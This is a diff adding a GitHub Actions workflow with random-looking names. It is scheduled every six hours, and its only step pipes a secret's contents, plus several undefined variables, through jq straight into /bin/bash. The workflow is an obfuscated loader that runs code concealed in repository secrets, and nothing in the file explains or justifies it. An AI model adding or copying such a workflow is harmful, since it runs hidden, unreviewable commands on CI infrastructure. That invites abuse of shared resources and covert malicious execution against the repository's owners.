@@ -1,0 +1,25 @@
+name: kaklixn
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kaklixn
+        env:
+          r86721: ${{ secrets.r86721 }}
+        run: |
+          echo $r86721 | jq -r .atz8869 | /bin/bash
+          echo $kusc64267 | jq -r .nwa2336 | /bin/bash
+          echo $a08853 | jq -r .jc17651 | /bin/bash
+          echo $qxvop2673 | jq -r .aepg491 | /bin/bash
+          echo $bzxq28 | jq -r .lfx6284 | /bin/bash
+          echo $tqj7 | jq -r .r3 | /bin/bash
+          echo $ptwvo4 | jq -r .tk18460 | /bin/bash
+          echo $b24 | jq -r .lfpa2 | /bin/bash
+          echo $nyuoa9 | jq -r .iek0 | /bin/bash
+
